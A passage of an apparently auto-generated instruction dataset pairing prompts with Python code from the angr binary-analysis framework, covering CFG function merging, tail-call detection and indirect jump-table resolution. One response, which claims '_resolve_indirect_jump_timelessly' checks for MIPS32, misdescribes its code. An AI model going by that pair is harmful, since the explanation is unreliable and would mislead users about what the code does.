disable=unidiomatic-typecheck\n                    target_addr = target.value\n                elif type(target) is int:  # pylint: disable=unidiomatic-typecheck\n                    target_addr = target\n                else:\n                    continue\n\n                if target_addr != addr_1:\n                    continue\n\n                cfgnode_0 = self.model.get_any_node(addr_0)\n                cfgnode_1 = self.model.get_any_node(addr_1)\n\n                # Are func_0 adjacent to func_1?\n                if cfgnode_0.addr + cfgnode_0.size != addr_1:\n                    continue\n\n                # Merge block addr_0 and block addr_1\n                l.debug(\"Merging function %#x into %#x.\", addr_1, addr_0)\n                self._merge_cfgnodes(cfgnode_0, cfgnode_1)\n                adjusted_cfgnodes.add(cfgnode_0)\n                adjusted_cfgnodes.add(cfgnode_1)\n\n                # Merge it\n                func_1 = functions[addr_1]\n                for block_addr in func_1.block_addrs:\n                    if block_addr == addr_1:\n                        # Skip addr_1 (since it has been merged to the preceding block)\n                        continue\n                    merge_with = self._addr_to_function(addr_0, blockaddr_to_function, functions)\n                    blockaddr_to_function[block_addr] = merge_with\n\n                functions_to_remove.add(addr_1)\n\n        for to_remove in functions_to_remove:\n            del functions[to_remove]\n\n        return functions_to_remove, adjusted_cfgnodes"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nconverting an address to a Function object and store the mapping between the block addresses to the function object.", "response": "def _addr_to_function(self, addr, blockaddr_to_function, known_functions):\n        \"\"\"\n        Convert an address to a Function object, and store the mapping in a dict. If the block is known to be part of a\n        function, just return that function.\n\n        :param int addr: Address to convert\n        :param dict blockaddr_to_function: A mapping between block addresses to Function instances.\n        :param angr.knowledge_plugins.FunctionManager known_functions: Recovered functions.\n        :return: a Function object\n        :rtype: angr.knowledge.Function\n        \"\"\"\n\n        if addr in blockaddr_to_function:\n            f = blockaddr_to_function[addr]\n        else:\n            is_syscall = self.project.simos.is_syscall_addr(addr)\n\n            n = self.model.get_any_node(addr, is_syscall=is_syscall)\n            if n is None: node = addr\n            else: node = self._to_snippet(n)\n\n            if isinstance(addr, SootAddressDescriptor):\n                addr = addr.method\n\n            self.kb.functions._add_node(addr, node, syscall=is_syscall)\n            f = self.kb.functions.function(addr=addr)\n\n            blockaddr_to_function[addr] = f\n\n            function_is_returning = False\n            if addr in known_functions:\n                if known_functions.function(addr).returning:\n                    f.returning = True\n                    function_is_returning = True\n\n            if not function_is_returning:\n                # We will rerun function feature analysis on this function later. Add it to\n                # self._updated_nonreturning_functions so it can be picked up by function feature analysis later.\n                if self._updated_nonreturning_functions is not None:\n                    self._updated_nonreturning_functions.add(addr)\n\n        return f"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncheck if the source and destination nodes are tail - call optimizations.", "response": "def _is_tail_call_optimization(self, g : networkx.DiGraph, src_addr, dst_addr, src_function, all_edges,\n                                   known_functions, blockaddr_to_function):\n        \"\"\"\n        If source and destination belong to the same function, and the following criteria apply:\n        - source node has only one default exit\n        - destination is not one of the known functions\n        - destination does not belong to another function, or destination belongs to the same function that\n          source belongs to\n        - at the end of the block, the SP offset is 0\n        - for all other edges that are pointing to the destination node, their source nodes must only have one default\n          exit, too\n\n        :return:    True if it is a tail-call optimization. False otherwise.\n        :rtype:     bool\n        \"\"\"\n\n        def _has_more_than_one_exit(node_):\n            return len(g.out_edges(node_)) > 1\n\n        if len(all_edges) == 1 and dst_addr != src_addr:\n            the_edge = next(iter(all_edges))\n            _, dst, data = the_edge\n            if data.get('stmt_idx', None) != DEFAULT_STATEMENT:\n                return False\n\n            dst_in_edges = g.in_edges(dst, data=True)\n            if len(dst_in_edges) > 1:\n                # there are other edges going to the destination node. check all edges to make sure all source nodes\n                # only have one default exit\n                if any(data.get('stmt_idx', None) != DEFAULT_STATEMENT for _, _, data in dst_in_edges):\n                    # some nodes are jumping to the destination node via non-default edges. skip.\n                    return False\n                if any(_has_more_than_one_exit(src_) for src_, _, _ in dst_in_edges):\n                    # at least one source node has more than just the default exit. skip.\n                    return False\n\n            candidate = False\n            if dst_addr in known_functions:\n                # dst_addr cannot be the same as src_function.addr. Pass\n                pass\n            elif dst_addr in blockaddr_to_function:\n                # it seems that we already know where this function should belong to. Pass.\n                dst_func = blockaddr_to_function[dst_addr]\n                if dst_func is src_function:\n                    # they belong to the same function right now, but they'd better not\n                    candidate = True\n                    # treat it as a tail-call optimization\n            else:\n                # we don't know where it belongs to\n                # treat it as a tail-call optimization\n                candidate = True\n\n            if candidate:\n                regs = {self.project.arch.sp_offset}\n                if hasattr(self.project.arch, 'bp_offset') and self.project.arch.bp_offset is not None:\n                    regs.add(self.project.arch.bp_offset)\n                sptracker = self.project.analyses.StackPointerTracker(src_function, regs, track_memory=self._sp_tracking_track_memory)\n                sp_delta = sptracker.offset_after_block(src_addr, self.project.arch.sp_offset)\n                if sp_delta == 0:\n                    return True\n\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _graph_traversal_handler(self, g, src, dst, data, blockaddr_to_function, known_functions, all_edges):\n\n        src_addr = src.addr\n        src_function = self._addr_to_function(src_addr, blockaddr_to_function, known_functions)\n\n        if src_addr not in src_function.block_addrs_set:\n            n = self.model.get_any_node(src_addr)\n            if n is None: node = src_addr\n            else: node = self._to_snippet(n)\n            self.kb.functions._add_node(src_function.addr, node)\n\n        if data is None:\n            # it's a single node only\n            return\n\n        jumpkind = data['jumpkind']\n\n        if jumpkind == 'Ijk_Ret':\n            n = self.model.get_any_node(src_addr)\n            if n is None: from_node = src_addr\n            else: from_node = self._to_snippet(n)\n            self.kb.functions._add_return_from(src_function.addr, from_node, None)\n\n        if dst is None:\n            return\n\n        dst_addr = dst.addr\n\n        # get instruction address and statement index\n        ins_addr = data.get('ins_addr', None)\n        stmt_idx = data.get('stmt_idx', None)\n\n        if jumpkind == 'Ijk_Call' or jumpkind.startswith('Ijk_Sys'):\n\n            is_syscall = jumpkind.startswith('Ijk_Sys')\n\n            # It must be calling a function\n            dst_function = self._addr_to_function(dst_addr, blockaddr_to_function, known_functions)\n\n            n = self.model.get_any_node(src_addr)\n            if n is None: src_snippet = self._to_snippet(addr=src_addr, base_state=self._base_state)\n            else:\n                src_snippet = self._to_snippet(cfg_node=n)\n\n            # HACK: FIXME: We need a better way of representing unresolved calls and whether they return.\n            # For now, assume UnresolvedTarget returns if we're calling to it\n\n            # If the function doesn't return, don't add a fakeret!\n            if not all_edges or (dst_function.returning is False and not dst_function.name == 'UnresolvableCallTarget'):\n                fakeret_node = None\n            else:\n                fakeret_node = self._one_fakeret_node(all_edges)\n\n            if fakeret_node is None:\n                fakeret_snippet = None\n            else:\n                fakeret_snippet = self._to_snippet(cfg_node=fakeret_node)\n\n            if isinstance(dst_addr, SootAddressDescriptor):\n                dst_addr = dst_addr.method\n\n            self.kb.functions._add_call_to(src_function.addr, src_snippet, dst_addr, fakeret_snippet, syscall=is_syscall,\n                                           ins_addr=ins_addr, stmt_idx=stmt_idx)\n\n            if dst_function.returning:\n                returning_target = src.addr + src.size\n                if returning_target not in blockaddr_to_function:\n                    if returning_target not in known_functions:\n                        blockaddr_to_function[returning_target] = src_function\n                    else:\n                        self._addr_to_function(returning_target, blockaddr_to_function, known_functions)\n\n                to_outside = not blockaddr_to_function[returning_target] is src_function\n\n                n = self.model.get_any_node(returning_target)\n                if n is None:\n                    returning_snippet = self._to_snippet(addr=returning_target, base_state=self._base_state)\n                else:\n                    returning_snippet = self._to_snippet(cfg_node=n)\n\n                self.kb.functions._add_fakeret_to(src_function.addr, src_snippet, returning_snippet, confirmed=True,\n                                                  to_outside=to_outside\n                                                  )\n\n        elif jumpkind in ('Ijk_Boring', 'Ijk_InvalICache'):\n\n            # convert src_addr and dst_addr to CodeNodes\n            n = self.model.get_any_node(src_addr)\n            if n is None: src_node = src_addr\n            else: src_node = self._to_snippet(cfg_node=n)\n\n            n = self.model.get_any_node(dst_addr)\n            if n is None: dst_node = dst_addr\n            else: dst_node = self._to_snippet(cfg_node=n)\n\n            # pre-check: if source and destination do not belong to the same section, it must be jumping to another\n            # function\n            belong_to_same_section = self._addrs_belong_to_same_section(src_addr, dst_addr)\n            if not belong_to_same_section:\n                _ = self._addr_to_function(dst_addr, blockaddr_to_function, known_functions)\n\n            if self._detect_tail_calls:\n                if self._is_tail_call_optimization(g, src_addr, dst_addr, src_function, all_edges, known_functions,\n                                                   blockaddr_to_function):\n                    l.debug(\"Possible tail-call optimization detected at function %#x.\", dst_addr)\n                    # it's (probably) a tail-call optimization. we should make the destination node a new function\n                    # instead.\n                    blockaddr_to_function.pop(dst_addr, None)\n                    _ = self._addr_to_function(dst_addr, blockaddr_to_function, known_functions)\n                    self.kb.functions._add_outside_transition_to(src_function.addr, src_node, dst_node,\n                                                                 to_function_addr=dst_addr\n                                                                 )\n\n            # is it a jump to another function?\n            if isinstance(dst_addr, SootAddressDescriptor):\n                is_known_function_addr = dst_addr.method in known_functions and dst_addr.method.addr == dst_addr\n            else:\n                is_known_function_addr = dst_addr in known_functions\n\n            if is_known_function_addr or (\n                dst_addr in blockaddr_to_function and blockaddr_to_function[dst_addr] is not src_function\n            ):\n                # yes it is\n                dst_function_addr = blockaddr_to_function[dst_addr].addr if dst_addr in blockaddr_to_function else \\\n                    dst_addr\n\n                self.kb.functions._add_outside_transition_to(src_function.addr, src_node, dst_node,\n                                                             to_function_addr=dst_function_addr\n                                                             )\n\n                _ = self._addr_to_function(dst_addr, blockaddr_to_function, known_functions)\n            else:\n                # no it's not\n                # add the transition code\n\n                if dst_addr not in blockaddr_to_function:\n                    blockaddr_to_function[dst_addr] = src_function\n\n                self.kb.functions._add_transition_to(src_function.addr, src_node, dst_node, ins_addr=ins_addr,\n                                                     stmt_idx=stmt_idx\n                                                     )\n\n        elif jumpkind == 'Ijk_FakeRet':\n\n            # convert src_addr and dst_addr to CodeNodes\n            n = self.model.get_any_node(src_addr)\n            if n is None:\n                src_node = src_addr\n            else:\n                src_node = self._to_snippet(n)\n\n            n = self.model.get_any_node(dst_addr)\n            if n is None:\n                dst_node = dst_addr\n            else:\n                dst_node = self._to_snippet(n)\n\n\n            if dst_addr not in blockaddr_to_function:\n                if isinstance(dst_addr, SootAddressDescriptor):\n                    if dst_addr.method not in known_functions:\n                        blockaddr_to_function[dst_addr] = src_function\n                        target_function = src_function\n                    else:\n                        target_function = self._addr_to_function(dst_addr, blockaddr_to_function, known_functions)\n                else:\n                    if dst_addr not in known_functions:\n                        blockaddr_to_function[dst_addr] = src_function\n                        target_function = src_function\n                    else:\n                        target_function = self._addr_to_function(dst_addr, blockaddr_to_function, known_functions)\n            else:\n                target_function = blockaddr_to_function[dst_addr]\n\n            # Figure out if the function called (not the function returned to) returns.\n            # We may have determined that this does not happen, since the time this path\n            # was scheduled for exploration\n            called_function = None\n            # Try to find the call that this fakeret goes with\n            for _, d, e in all_edges:\n                if e['jumpkind'] == 'Ijk_Call':\n                    if d.addr in blockaddr_to_function:\n                        called_function = blockaddr_to_function[d.addr]\n                        break\n            # We may have since figured out that the called function doesn't ret.\n            # It's important to assume that all unresolved targets do return\n            if called_function is not None and \\\n                    called_function.returning is False:\n                return\n\n            to_outside = not target_function is src_function\n\n            # FIXME: Not sure we should confirm this fakeret or not.\n            self.kb.functions._add_fakeret_to(src_function.addr, src_node, dst_node, confirmed=True,\n                                              to_outside=to_outside, to_function_addr=target_function.addr\n                                              )\n\n        else:\n            l.debug('Ignored jumpkind %s', jumpkind)", "response": "This function is called by the function manager when a CFG is traversed. It creates new functions or adds nodes to existing functions accordingly."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nchecks if the block is a no - op block by checking VEX statements.", "response": "def _is_noop_block(arch, block):\n        \"\"\"\n        Check if the block is a no-op block by checking VEX statements.\n\n        :param block: The VEX block instance.\n        :return: True if the entire block is a single-byte or multi-byte nop instruction, False otherwise.\n        :rtype: bool\n        \"\"\"\n\n        if arch.name == \"MIPS32\":\n            if arch.memory_endness == \"Iend_BE\":\n                MIPS32_BE_NOOPS = {\n                    b\"\\x00\\x20\\x08\\x25\",  # move $at, $at\n                }\n                insns = set(block.bytes[i:i+4] for i in range(0, block.size, 4))\n                if MIPS32_BE_NOOPS.issuperset(insns):\n                    return True\n\n        # Fallback\n        # the block is a noop block if it only has IMark statements\n\n        if all((type(stmt) is pyvex.IRStmt.IMark) for stmt in block.vex.statements):\n            return True\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _is_noop_insn(insn):\n\n        if insn.insn_name() == 'nop':\n            # nops\n            return True\n        if insn.insn_name() == 'lea':\n            # lea reg, [reg + 0]\n            op0, op1 = insn.operands\n            if op0.type == 1 and op1.type == 3:\n                # reg and mem\n                if op0.reg == op1.mem.base and op1.mem.index == 0 and op1.mem.disp == 0:\n                    return True\n\n        # add more types of no-op instructions here :-)\n\n        return False", "response": "Check if the instruction does nothing."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _get_nop_length(cls, insns):\n\n        nop_length = 0\n\n        if insns and cls._is_noop_insn(insns[0]):\n            # see where those nop instructions terminate\n            for insn in insns:\n                if cls._is_noop_insn(insn):\n                    nop_length += insn.size\n                else:\n                    break\n\n        return nop_length", "response": "Calculate the total length of leading nop instructions."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _lift(self, *args, **kwargs):\n        if 'backup_state' not in kwargs:\n            kwargs['backup_state'] = self._base_state\n        return self.project.factory.block(*args, **kwargs)", "response": "Internal helper to create a basic block of code."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _resolve_indirect_jump_timelessly(self, addr, block, func_addr, jumpkind):\n\n        if block.statements is None:\n            block = self.project.factory.block(block.addr, size=block.size).vex\n\n        for res in self.timeless_indirect_jump_resolvers:\n            if res.filter(self, addr, func_addr, block, jumpkind):\n                r, resolved_targets = res.resolve(self, addr, func_addr, block, jumpkind)\n                if r:\n                    return True, resolved_targets\n        return False, [ ]", "response": "Checks if MIPS32 and calls MIPS32 check otherwise false\n       "}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncall when an indirect jump is successfully resolved.", "response": "def _indirect_jump_resolved(self, jump, jump_addr, resolved_by, targets):\n        \"\"\"\n        Called when an indirect jump is successfully resolved.\n\n        :param IndirectJump jump:                   The resolved indirect jump, or None if an IndirectJump instance is\n                                                    not available.\n        :param int jump_addr:                       Address of the resolved indirect jump.\n        :param IndirectJumpResolver resolved_by:    The resolver used to resolve this indirect jump.\n        :param list targets:                        List of indirect jump targets.\n        :param CFGJob job:                          The job at the start of the block containing the indirect jump.\n\n        :return: None\n        \"\"\"\n\n        addr = jump.addr if jump is not None else jump_addr\n        l.debug('The indirect jump at %#x is successfully resolved by %s. It has %d targets.', addr, resolved_by, len(targets))\n        self.kb.resolved_indirect_jumps.add(addr)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _indirect_jump_unresolved(self, jump):\n\n        l.debug('Failed to resolve the indirect jump at %#x.', jump.addr)\n        # tell KnowledgeBase that it's not resolved\n        # TODO: self.kb._unresolved_indirect_jumps is not processed during normalization. Fix it.\n        self.kb.unresolved_indirect_jumps.add(jump.addr)", "response": "Called when we cannot resolve an indirect jump."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncalling when an indirect jump is encountered.", "response": "def _indirect_jump_encountered(self, addr, cfg_node, irsb, func_addr, stmt_idx=DEFAULT_STATEMENT):\n        \"\"\"\n        Called when we encounter an indirect jump. We will try to resolve this indirect jump using timeless (fast)\n        indirect jump resolvers. If it cannot be resolved, we will see if this indirect jump has been resolved before.\n\n        :param int addr:                Address of the block containing the indirect jump.\n        :param cfg_node:                The CFGNode instance of the block that contains the indirect jump.\n        :param pyvex.IRSB irsb:         The IRSB instance of the block that contains the indirect jump.\n        :param int func_addr:           Address of the current function.\n        :param int or str stmt_idx:     ID of the source statement.\n\n        :return:    A 3-tuple of (whether it is resolved or not, all resolved targets, an IndirectJump object\n                    if there is one or None otherwise)\n        :rtype:     tuple\n        \"\"\"\n\n        jumpkind = irsb.jumpkind\n        l.debug('(%s) IRSB %#x has an indirect jump as its default exit.', jumpkind, addr)\n\n        # try resolving it fast\n        resolved, resolved_targets = self._resolve_indirect_jump_timelessly(addr, irsb, func_addr, jumpkind)\n        if resolved:\n            return True, resolved_targets, None\n\n        # Add it to our set. Will process it later if user allows.\n        # Create an IndirectJump instance\n        if addr not in self.indirect_jumps:\n            if self.project.arch.branch_delay_slot:\n                ins_addr = cfg_node.instruction_addrs[-2]\n            else:\n                ins_addr = cfg_node.instruction_addrs[-1]\n            ij = IndirectJump(addr, ins_addr, func_addr, jumpkind, stmt_idx, resolved_targets=[])\n            self.indirect_jumps[addr] = ij\n            resolved = False\n        else:\n            ij = self.indirect_jumps[addr]  # type: IndirectJump\n            resolved = len(ij.resolved_targets) > 0\n\n        return resolved, ij.resolved_targets, ij"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _process_unresolved_indirect_jumps(self):\n\n        l.info(\"%d indirect jumps to resolve.\", len(self._indirect_jumps_to_resolve))\n\n        all_targets = set()\n        for idx, jump in enumerate(self._indirect_jumps_to_resolve):  # type:int,IndirectJump\n            if self._low_priority:\n                self._release_gil(idx, 20, 0.0001)\n            all_targets |= self._process_one_indirect_jump(jump)\n\n        self._indirect_jumps_to_resolve.clear()\n\n        return all_targets", "response": "Resolves unresolved indirect jumps in previous scanning."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nresolve a given indirect jump.", "response": "def _process_one_indirect_jump(self, jump):\n        \"\"\"\n        Resolve a given indirect jump.\n\n        :param IndirectJump jump:  The IndirectJump instance.\n        :return:        A set of resolved indirect jump targets (ints).\n        \"\"\"\n\n        resolved = False\n        resolved_by = None\n        targets = None\n\n        block = self._lift(jump.addr, opt_level=1)\n\n        for resolver in self.indirect_jump_resolvers:\n            resolver.base_state = self._base_state\n\n            if not resolver.filter(self, jump.addr, jump.func_addr, block, jump.jumpkind):\n                continue\n\n            resolved, targets = resolver.resolve(self, jump.addr, jump.func_addr, block, jump.jumpkind)\n            if resolved:\n                resolved_by = resolver\n                break\n\n        if resolved:\n            self._indirect_jump_resolved(jump, jump.addr, resolved_by, targets)\n        else:\n            self._indirect_jump_unresolved(jump)\n\n        return set() if targets is None else set(targets)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef resolve(self, cfg, addr, func_addr, block, jumpkind):\n        project = self.project  # short-hand\n        self._max_targets = cfg._indirect_jump_target_limit\n\n        # Perform a backward slicing from the jump target\n        b = Blade(cfg.graph, addr, -1,\n            cfg=cfg, project=project,\n            ignore_sp=False, ignore_bp=False,\n            max_level=3, base_state=self.base_state)\n\n        stmt_loc = (addr, DEFAULT_STATEMENT)\n        if stmt_loc not in b.slice:\n            return False, None\n\n        load_stmt_loc, load_stmt, load_size = None, None, None\n        stmts_to_remove = [stmt_loc]\n        stmts_adding_base_addr = [ ]  # type: list[JumpTargetBaseAddr]\n        # All temporary variables that hold indirect addresses loaded out of the memory\n        # Obviously, load_stmt.tmp must be here\n        # if there are additional data transferring statements between the Load statement and the base-address-adding\n        # statement, all_addr_holders will have more than one temporary variables\n        #\n        # Here is an example:\n        #\n        # IRSB 0x4c64c4\n        #  + 06 | t12 = LDle:I32(t7)\n        #  + 07 | t11 = 32Sto64(t12)\n        #  + 10 | t2 = Add64(0x0000000000571df0,t11)\n        #\n        # all_addr_holders will be {(0x4c64c4, 11): AddressTransferringTypes.SignedExtension32to64,\n        #           (0x4c64c4, 12); AddressTransferringTypes.Assignment,\n        #           }\n        all_addr_holders = OrderedDict()\n\n        while True:\n            preds = list(b.slice.predecessors(stmt_loc))\n            if len(preds) != 1:\n                return False, None\n            block_addr, stmt_idx = stmt_loc = preds[0]\n            block = project.factory.block(block_addr, backup_state=self.base_state).vex\n            stmt = block.statements[stmt_idx]\n            if isinstance(stmt, (pyvex.IRStmt.WrTmp, pyvex.IRStmt.Put)):\n                if isinstance(stmt.data, (pyvex.IRExpr.Get, pyvex.IRExpr.RdTmp)):\n                    # data transferring\n                    stmts_to_remove.append(stmt_loc)\n                    if isinstance(stmt, pyvex.IRStmt.WrTmp):\n                        all_addr_holders[(stmt_loc[0], stmt.tmp)] = AddressTransferringTypes.Assignment\n                    continue\n                elif isinstance(stmt.data, pyvex.IRExpr.ITE):\n                    # data transferring\n                    #   t16 = if (t43) ILGop_Ident32(LDle(t29)) else 0x0000c844\n                    # > t44 = ITE(t43,t16,0x0000c844)\n                    stmts_to_remove.append(stmt_loc)\n                    if isinstance(stmt, pyvex.IRStmt.WrTmp):\n                        all_addr_holders[(stmt_loc[0], stmt.tmp)] = AddressTransferringTypes.Assignment\n                    continue\n                elif isinstance(stmt.data, pyvex.IRExpr.Unop):\n                    if stmt.data.op == 'Iop_32Sto64':\n                        # data transferring with conversion\n                        # t11 = 32Sto64(t12)\n                        stmts_to_remove.append(stmt_loc)\n                        if isinstance(stmt, pyvex.IRStmt.WrTmp):\n                            all_addr_holders[(stmt_loc[0], stmt.tmp)] = AddressTransferringTypes.SignedExtension32to64\n                        continue\n                    elif stmt.data.op == 'Iop_64to32':\n                        # data transferring with conversion\n                        # t24 = 64to32(t21)\n                        stmts_to_remove.append(stmt_loc)\n                        if isinstance(stmt, pyvex.IRStmt.WrTmp):\n                            all_addr_holders[(stmt_loc[0], stmt.tmp)] = AddressTransferringTypes.Truncation64to32\n                        continue\n                    elif stmt.data.op == 'Iop_32Uto64':\n                        # data transferring with conversion\n                        # t21 = 32Uto64(t22)\n                        stmts_to_remove.append(stmt_loc)\n                        if isinstance(stmt, pyvex.IRStmt.WrTmp):\n                            all_addr_holders[(stmt_loc[0], stmt.tmp)] = AddressTransferringTypes.UnsignedExtension32to64\n                        continue\n                elif isinstance(stmt.data, pyvex.IRExpr.Binop) and stmt.data.op.startswith('Iop_Add'):\n                    # GitHub issue #1289, a S390X binary\n                    # jump_label = &jump_table + *(jump_table[index])\n                    #       IRSB 0x4007c0\n                    #   00 | ------ IMark(0x4007c0, 4, 0) ------\n                    # + 01 | t0 = GET:I32(212)\n                    # + 02 | t1 = Add32(t0,0xffffffff)\n                    #   03 | PUT(352) = 0x0000000000000003\n                    #   04 | t13 = 32Sto64(t0)\n                    #   05 | t6 = t13\n                    #   06 | PUT(360) = t6\n                    #   07 | PUT(368) = 0xffffffffffffffff\n                    #   08 | PUT(376) = 0x0000000000000000\n                    #   09 | PUT(212) = t1\n                    #   10 | PUT(ia) = 0x00000000004007c4\n                    #   11 | ------ IMark(0x4007c4, 6, 0) ------\n                    # + 12 | t14 = 32Uto64(t1)\n                    # + 13 | t8 = t14\n                    # + 14 | t16 = CmpLE64U(t8,0x000000000000000b)\n                    # + 15 | t15 = 1Uto32(t16)\n                    # + 16 | t10 = t15\n                    # + 17 | t11 = CmpNE32(t10,0x00000000)\n                    # + 18 | if (t11) { PUT(offset=336) = 0x4007d4; Ijk_Boring }\n                    #   Next: 0x4007ca\n                    #\n                    #       IRSB 0x4007d4\n                    #   00 | ------ IMark(0x4007d4, 6, 0) ------\n                    # + 01 | t8 = GET:I64(r2)\n                    # + 02 | t7 = Shr64(t8,0x3d)\n                    # + 03 | t9 = Shl64(t8,0x03)\n                    # + 04 | t6 = Or64(t9,t7)\n                    # + 05 | t11 = And64(t6,0x00000007fffffff8)\n                    #   06 | ------ IMark(0x4007da, 6, 0) ------\n                    #   07 | PUT(r1) = 0x0000000000400a50\n                    #   08 | PUT(ia) = 0x00000000004007e0\n                    #   09 | ------ IMark(0x4007e0, 6, 0) ------\n                    # + 10 | t12 = Add64(0x0000000000400a50,t11)\n                    # + 11 | t16 = LDbe:I64(t12)\n                    #   12 | PUT(r2) = t16\n                    #   13 | ------ IMark(0x4007e6, 4, 0) ------\n                    # + 14 | t17 = Add64(0x0000000000400a50,t16)\n                    # + Next: t17\n                    #\n                    # Special case: a base address is added to the loaded offset before jumping to it.\n                    if isinstance(stmt.data.args[0], pyvex.IRExpr.Const) and \\\n                            isinstance(stmt.data.args[1], pyvex.IRExpr.RdTmp):\n                        stmts_adding_base_addr.append(JumpTargetBaseAddr(stmt_loc, stmt,\n                                                                         stmt.data.args[1].tmp,\n                                                                         base_addr=stmt.data.args[0].con.value)\n                                                      )\n                        stmts_to_remove.append(stmt_loc)\n                    elif isinstance(stmt.data.args[0], pyvex.IRExpr.RdTmp) and \\\n                            isinstance(stmt.data.args[1], pyvex.IRExpr.Const):\n                        stmts_adding_base_addr.append(JumpTargetBaseAddr(stmt_loc, stmt,\n                                                                         stmt.data.args[0].tmp,\n                                                                         base_addr=stmt.data.args[1].con.value)\n                                                      )\n                        stmts_to_remove.append(stmt_loc)\n                    elif isinstance(stmt.data.args[0], pyvex.IRExpr.RdTmp) and \\\n                            isinstance(stmt.data.args[1], pyvex.IRExpr.RdTmp):\n                        # one of the tmps must be holding a concrete value at this point\n                        stmts_adding_base_addr.append(JumpTargetBaseAddr(stmt_loc, stmt,\n                                                                         stmt.data.args[0].tmp,\n                                                                         tmp_1=stmt.data.args[1].tmp)\n                                                      )\n                        stmts_to_remove.append(stmt_loc)\n                    else:\n                        # not supported\n                        pass\n                    continue\n                elif isinstance(stmt.data, pyvex.IRExpr.Load):\n                    # Got it!\n                    load_stmt, load_stmt_loc, load_size = stmt, stmt_loc, \\\n                                                          block.tyenv.sizeof(stmt.tmp) // self.project.arch.byte_width\n                    stmts_to_remove.append(stmt_loc)\n            elif isinstance(stmt, pyvex.IRStmt.LoadG):\n                # Got it!\n                #\n                # this is how an ARM jump table is translated to VEX\n                # > t16 = if (t43) ILGop_Ident32(LDle(t29)) else 0x0000c844\n                load_stmt, load_stmt_loc, load_size = stmt, stmt_loc, \\\n                                                      block.tyenv.sizeof(stmt.dst) // self.project.arch.byte_width\n                stmts_to_remove.append(stmt_loc)\n\n            break\n\n        if load_stmt_loc is None:\n            # the load statement is not found\n            return False, None\n\n        # If we're just reading a constant, don't bother with the rest of this mess!\n        if isinstance(load_stmt, pyvex.IRStmt.WrTmp):\n            if type(load_stmt.data.addr) is pyvex.IRExpr.Const:\n                # It's directly loading from a constant address\n                # e.g.,\n                #  ldr r0, =main+1\n                #  blx r0\n                # It's not a jump table, but we resolve it anyway\n                jump_target_addr = load_stmt.data.addr.con.value\n                jump_target = cfg._fast_memory_load_pointer(jump_target_addr)\n                if jump_target is None:\n                    l.info(\"Constant indirect jump at %#08x points outside of loaded memory to %#08x\", addr, jump_target_addr)\n                    return False, None\n                l.info(\"Resolved constant indirect jump from %#08x to %#08x\", addr, jump_target_addr)\n                ij = cfg.indirect_jumps[addr]\n                ij.jumptable = False\n                ij.resolved_targets = set([jump_target])\n                return True, [jump_target]\n        elif isinstance(load_stmt, pyvex.IRStmt.LoadG):\n            if type(load_stmt.addr) is pyvex.IRExpr.Const:\n                # It's directly loading from a constant address\n                # e.g.,\n                #  4352c     SUB     R1, R11, #0x1000\n                #  43530     LDRHI   R3, =loc_45450\n                #  ...\n                #  43540     MOV     PC, R3\n                #\n                # It's not a jump table, but we resolve it anyway\n                # Note that this block has two branches: One goes to 45450, the other one goes to whatever the original\n                # value of R3 is. Some intensive data-flow analysis is required in this case.\n                jump_target_addr = load_stmt.addr.con.value\n                jump_target = cfg._fast_memory_load_pointer(jump_target_addr)\n                l.info(\"Resolved constant indirect jump from %#08x to %#08x\", addr, jump_target_addr)\n                ij = cfg.indirect_jumps[addr]\n                ij.jumptable = False\n                ij.resolved_targets = set([jump_target])\n                return True, [jump_target]\n        # Well, we have a real jumptable to resolve!\n\n        # If we're just reading a constant, don't bother with the rest of this mess!\n        if isinstance(load_stmt, pyvex.IRStmt.WrTmp):\n            if type(load_stmt.data.addr) is pyvex.IRExpr.Const:\n                # It's directly loading from a constant address\n                # e.g.,\n                #  ldr r0, =main+1\n                #  blx r0\n                # It's not a jump table, but we resolve it anyway\n                jump_target_addr = load_stmt.data.addr.con.value\n                jump_target = cfg._fast_memory_load_pointer(jump_target_addr)\n                if not jump_target:\n                    #...except this constant looks like a jumpout!\n                    l.info(\"Constant indirect jump directed out of the binary at #%08x\", addr)\n                    return False, []\n                l.info(\"Resolved constant indirect jump from %#08x to %#08x\", addr, jump_target_addr)\n                ij = cfg.indirect_jumps[addr]\n                ij.jumptable = False\n                ij.resolved_targets = set([jump_target])\n                return True, [jump_target]\n        elif isinstance(load_stmt, pyvex.IRStmt.LoadG):\n            if type(load_stmt.addr) is pyvex.IRExpr.Const:\n                # It's directly loading from a constant address\n                # e.g.,\n                #  4352c     SUB     R1, R11, #0x1000\n                #  43530     LDRHI   R3, =loc_45450\n                #  ...\n                #  43540     MOV     PC, R3\n                #\n                # It's not a jump table, but we resolve it anyway\n                # Note that this block has two branches: One goes to 45450, the other one goes to whatever the original\n                # value of R3 is. Some intensive data-flow analysis is required in this case.\n                jump_target_addr = load_stmt.addr.con.value\n                jump_target = cfg._fast_memory_load_pointer(jump_target_addr)\n                l.info(\"Resolved constant indirect jump from %#08x to %#08x\", addr, jump_target_addr)\n                ij = cfg.indirect_jumps[addr]\n                ij.jumptable = False\n                ij.resolved_targets = set([jump_target])\n                return True, [jump_target]\n        # skip all statements before the load statement\n        # We want to leave the final loaded value as symbolic, so we can\n        # get the full range of possibilities\n        b.slice.remove_nodes_from(stmts_to_remove)\n\n        # Debugging output\n        if l.level == logging.DEBUG:\n            self._dbg_repr_slice(b)\n\n        # Get all sources\n        sources = [ n_ for n_ in b.slice.nodes() if b.slice.in_degree(n_) == 0 ]\n\n        # Create the annotated CFG\n        annotatedcfg = AnnotatedCFG(project, None, detect_loops=False)\n        annotatedcfg.from_digraph(b.slice)\n\n        # 